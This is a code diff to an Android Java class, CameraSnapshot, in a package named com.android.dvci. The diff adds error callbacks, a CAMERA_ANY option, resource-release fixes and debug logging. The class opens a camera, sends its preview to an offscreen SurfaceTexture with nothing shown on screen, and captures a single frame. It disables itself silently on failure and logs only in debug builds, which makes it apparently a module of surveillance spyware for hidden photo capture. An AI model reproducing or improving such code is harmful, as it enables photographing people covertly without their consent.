@@ -35,6 +35,7 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
 
 import java.io.ByteArrayOutputStream;
+import java.io.IOException;
 import java.io.OutputStream;
 import java.util.List;
 import java.util.concurrent.Semaphore;
@@ -64,10 +65,39 @@ import java.util.concurrent.Semaphore;
  */
 public class CameraSnapshot {
 	private static final String TAG = "CameraSnapshot";
+	public static final int CAMERA_ANY = -1;
 	private Object cameraLock = new Object();
 
 	private static CameraSnapshot singleton = null;
 	private boolean enable = true;
+	private Camera.AutoFocusCallback autofocusCallback = new Camera.AutoFocusCallback() {
+		@Override
+		@TargetApi(Build.VERSION_CODES.HONEYCOMB)
+		public void onAutoFocus(boolean b, Camera camera) {
+			CameraSnapshot snap = CameraSnapshot.self();
+
+
+		}
+	};
+	private Camera.ErrorCallback errorCallback = new Camera.ErrorCallback() {
+		@Override
+		public void onError(int error, Camera camera) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onError), Error: " + error );
+			}
+
+			if(error == Camera.CAMERA_ERROR_SERVER_DIED){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onError), Error: CAMERA_ERROR_SERVER_DIED" );
+				}
+			}else if(error == Camera.CAMERA_ERROR_UNKNOWN){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onError), Error: CAMERA_ERROR_UNKNOWN" );
+				}
+			}
+
+		}
+	};
 
 	public static CameraSnapshot self(){
 		if(singleton==null){
@@ -76,7 +106,7 @@ public class CameraSnapshot {
 		return singleton;
 	}
 
-	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
+
 	private CameraSnapshot(){
 
 	}
@@ -134,15 +164,19 @@ public class CameraSnapshot {
 		final int encWidth = 768; //1024;
 		final int encHeight = 432; //768;
 
+		//if(Status.self().startedSeconds() < 30){
+		//	return;
+		//}
 		//768x432
 		if(!enable){
 			return;
 		}
+		Camera camera = null;
 
 		synchronized (cameraLock) {
 			try {
-				Camera mCamera = prepareCamera(cameraId, encWidth, encHeight);
-				if (mCamera == null) {
+				camera = prepareCamera(cameraId, encWidth, encHeight);
+				if (camera == null) {
 					this.enable = false;
 					return;
 				}
@@ -164,14 +198,21 @@ public class CameraSnapshot {
 
 					this.surface = new SurfaceTexture(surfaceparams[0]);
 				}
-				mCamera.setPreviewTexture(this.surface);
-				mCamera.startPreview();
-				mCamera.setOneShotPreviewCallback(this.previewCallback);
+
+				//camera.autoFocus(this.autofocusCallback);
+				camera.setPreviewTexture(surface);
+
+				camera.startPreview();
+				//byte[] buffer = new byte[]{};
+				//camera.addCallbackBuffer(buffer);
+				//camera.setPreviewCallbackWithBuffer(previewCallback);
+				camera.setOneShotPreviewCallback(previewCallback);
 
 				cameraLock.wait();
 
-				releaseCamera(mCamera);
+				releaseCamera(camera);
 			} catch (Exception e) {
+				releaseCamera(camera);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (snapshot) ERROR: " + e);
 				}
@@ -186,21 +227,30 @@ public class CameraSnapshot {
 		int cameraCount = Camera.getNumberOfCameras();
 		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
 			Camera.getCameraInfo(camIdx, cameraInfo);
+
 			if(cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (openCamera), found FACE CAMERA");
 				}
 				//continue;
 			}
-			if (requestFace == cameraInfo.facing) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openCamera), orientation: " +  cameraInfo.orientation);
+			}
+			if (requestFace == cameraInfo.facing || requestFace == CAMERA_ANY) {
 				try {
-					cam = Camera.open(camIdx);
+
+					if(requestFace == CAMERA_ANY){
+						cam = Camera.open();
+					}else {
+						cam = Camera.open(camIdx);
+					}
+
 					if(cam!=null) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (openCamera), opened: " + camIdx);
 						}
-						//Utils.sleep(10);
-						//setCameraDisplayOrientation(camIdx, cam);
+
 						return cam;
 					}
 				} catch (RuntimeException e) {
@@ -222,12 +272,16 @@ public class CameraSnapshot {
 	private Camera prepareCamera(int cameraId, int encWidth, int encHeight) {
 		try {
 
-			Camera mCamera = openCamera(cameraId);
-			if(mCamera == null){
+			Camera camera = openCamera(cameraId);
+			if(camera == null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (prepareCamera), cannot open camera: " + cameraId);
+				}
 				return null;
 			}
+			camera.setErrorCallback(this.errorCallback);
 
-			Camera.Parameters cameraParms = mCamera.getParameters();
+			Camera.Parameters cameraParms = camera.getParameters();
 			List<String> modes = cameraParms.getSupportedFocusModes();
 			if(modes.contains("continuous-picture")) {
 				cameraParms.setFocusMode("continuous-picture");
@@ -239,7 +293,7 @@ public class CameraSnapshot {
 
 			choosePreviewSize(cameraParms, encWidth, encHeight);
 			// leave the frame rate set to default
-			mCamera.setParameters(cameraParms);
+			camera.setParameters(cameraParms);
 
 			Camera.Size size = cameraParms.getPreviewSize();
 
@@ -247,7 +301,7 @@ public class CameraSnapshot {
 				Check.log(TAG + " (prepareCamera), Camera preview size is " + size.width + "x" + size.height);
 			}
 
-			return mCamera;
+			return camera;
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (prepareCamera), ERROR " + ex);
@@ -378,6 +432,13 @@ public class CameraSnapshot {
 	 */
 	private synchronized void releaseCamera(Camera camera) {
 		if (camera != null) {
+			try {
+				camera.reconnect();
+			} catch (IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (releaseCamera), ERROR: " + e);
+				}
+			}
 			camera.stopPreview();
 			camera.release();
 		}
